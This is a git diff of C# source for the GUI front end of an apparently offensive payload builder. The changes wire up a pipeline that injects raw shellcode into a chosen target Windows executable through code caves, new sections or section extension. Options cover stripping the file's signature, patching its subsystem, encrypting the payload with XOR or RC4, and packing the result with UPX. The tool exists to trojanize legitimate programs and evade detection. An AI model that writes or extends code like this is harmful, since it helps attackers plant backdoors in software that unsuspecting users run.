@@ -614,20 +614,33 @@ public sealed partial class CompilePage : Page
                 }
             }
 
-            // ── Step 2: Backdoor (optional) ──────────────────────────────
+            // ── Step 2: Backdoor target PE with ORIGINAL shellcode ─────
+            // The compiled .exe is a standalone loader (uses IAT imports, NOT position-independent).
+            // For PE backdooring we must inject the ORIGINAL raw shellcode .bin, not the compiled loader.
             if (backdoorPage?.IsBackdooringEnabled == true && backdoorPage.TargetPeFilePath != null)
             {
                 CompileProgressText.Text = "Step 2: Backdooring target PE...";
                 _logger.Info("\n[Step 2] Backdooring target executable...");
-                currentOutput = await RunBackdoorStepAsync(backdoorPage, currentOutput, outputDir)
-                                ?? currentOutput;
+
+                // Resolve the original shellcode .bin path
+                string? originalShellcode = ResolveOriginalShellcodePath(mainPage);
+                if (originalShellcode != null && File.Exists(originalShellcode))
+                {
+                    _logger.Info($"Using original shellcode: {Path.GetFileName(originalShellcode)} ({new FileInfo(originalShellcode).Length:N0} bytes)");
+                    currentOutput = await RunBackdoorStepAsync(backdoorPage, originalShellcode, outputDir)
+                                    ?? currentOutput;
+                }
+                else
+                {
+                    _logger.Warn("Original shellcode .bin not found — backdoor step skipped.");
+                }
             }
             else
             {
                 _logger.Info("\n[Step 2] Backdooring: Skipped (disabled)");
             }
 
-            // ── Step 3: Pack (optional) ───────────────────────────────────
+            // ── Step 4: Pack (optional) ───────────────────────────────────
             if (packingPage?.IsPackingEnabled == true && !string.IsNullOrEmpty(packingPage.UpxPath))
             {
                 CompileProgressText.Text = "Step 3: Packing with UPX...";
@@ -818,24 +831,90 @@ public sealed partial class CompilePage : Page
         }
     }
 
+    /// <summary>
+    /// Resolves the original raw shellcode .bin path from the current MainPage configuration.
+    /// For File source: returns the file path directly.
+    /// For Raw source: writes hex to a temp .bin file.
+    /// For URL source: not supported (returns null).
+    /// </summary>
+    private string? ResolveOriginalShellcodePath(MainPage mainPage)
+    {
+        switch (mainPage.CurrentShellcodeSource)
+        {
+            case ShellcodeSource.File:
+                var scFile = mainPage.ShellcodeFileTextBox.Text.Trim();
+                if (!string.IsNullOrEmpty(scFile) && File.Exists(scFile))
+                    return scFile;
+                _logger.Warn($"Shellcode file not found: {scFile}");
+                return null;
+
+            case ShellcodeSource.Raw:
+                var hex = mainPage.ShellcodeRawTextBox.Text.Trim();
+                if (string.IsNullOrEmpty(hex)) return null;
+                try
+                {
+                    var tempBin = Path.Combine(Path.GetTempPath(), $"wm_raw_{Guid.NewGuid():N}.bin");
+                    File.WriteAllBytes(tempBin, Convert.FromHexString(hex.Replace(" ", "").Replace("\n", "").Replace("\r", "")));
+                    return tempBin;
+                }
+                catch (Exception ex)
+                {
+                    _logger.Error($"Failed to write raw shellcode: {ex.Message}");
+                    return null;
+                }
+
+            default:
+                _logger.Warn($"Shellcode source '{mainPage.CurrentShellcodeSource}' not supported for direct backdooring.");
+                return null;
+        }
+    }
+
+    /// <summary>
+    /// Strip a compiled loader .exe into a flat .bin suitable for injection.
+    /// </summary>
+    private async Task<string?> RunStripStepAsync(string compiledExe, string outputDir)
+    {
+        if (!_cli.IsAvailable)
+        {
+            _logger.Warn("CLI not available — strip step skipped.");
+            return null;
+        }
+
+        var binName = Path.GetFileNameWithoutExtension(compiledExe) + ".bin";
+        var outBin = Path.Combine(outputDir, binName);
+
+        var args = new List<string>
+        {
+            "strip",
+            compiledExe,
+            "-o", outBin,
+            "--mode", "ep",
+        };
+
+        var result = await _cli.RunAsync(args, line => _logger.Info(line));
+
+        if (result.Success && File.Exists(outBin))
+        {
+            var size = new FileInfo(outBin).Length;
+            _logger.Info($"Stripped {Path.GetFileName(compiledExe)} → {binName} ({size:N0} bytes)");
+            return outBin;
+        }
+
+        _logger.Warn($"Strip failed (exit {result.ExitCode}).");
+        return null;
+    }
+
     private async Task<string?> RunBackdoorStepAsync(
         BackdooringPage backdoorPage,
-        string currentExe,
+        string shellcodeBinPath,
         string outputDir)
     {
         var targetPe = backdoorPage.TargetPeFilePath;
         if (targetPe == null) return null;
 
-        // The shellcode for backdooring is the raw .bin (not the compiled loader)
-        // Look for the most recent shellcode in the GUI temp dir
-        var tempShellcodeDir = _paths.EnsureTempShellcodeDirectory();
-        var shellcodeBin = Directory.GetFiles(tempShellcodeDir, "*.bin", SearchOption.TopDirectoryOnly)
-                                    .OrderByDescending(File.GetLastWriteTime)
-                                    .FirstOrDefault();
-
-        if (shellcodeBin == null || !File.Exists(shellcodeBin))
+        if (!File.Exists(shellcodeBinPath))
         {
-            _logger.Warn("Raw shellcode .bin not found for backdooring — skipping.");
+            _logger.Warn($"Shellcode binary not found: {shellcodeBinPath} — skipping.");
             return null;
         }
 
@@ -851,9 +930,37 @@ public sealed partial class CompilePage : Page
         {
             "backdoor",
             "--pe",        targetPe,
-            "--shellcode", shellcodeBin,
+            "--shellcode", shellcodeBinPath,
             "--output",    outFile,
         };
+
+        // Pass GUI-selected options to CLI
+        var method = backdoorPage.SelectedInjectionMethod switch
+        {
+            InjectionMethod.CodeCave => "code-cave",
+            InjectionMethod.NewSection => "new-section",
+            InjectionMethod.SectionExtension => "section-ext",
+            _ => "code-cave"
+        };
+        args.AddRange(new[] { "--method", method });
+
+        if (!backdoorPage.RemoveSignature)
+            args.Add("--no-remove-sig");
+        if (!backdoorPage.PatchSubsystemToGui)
+            args.Add("--no-patch-subsystem");
+
+        var encryption = backdoorPage.SelectedEncryption;
+        if (encryption != PayloadEncryption.None)
+        {
+            var encStr = encryption switch
+            {
+                PayloadEncryption.Xor => "xor",
+                PayloadEncryption.Xor2 => "xor2",
+                PayloadEncryption.Rc4 => "rc4",
+                _ => "none"
+            };
+            args.AddRange(new[] { "--enc", encStr });
+        }
 
         var result = await _cli.RunAsync(args, line => _logger.Info(line));
 
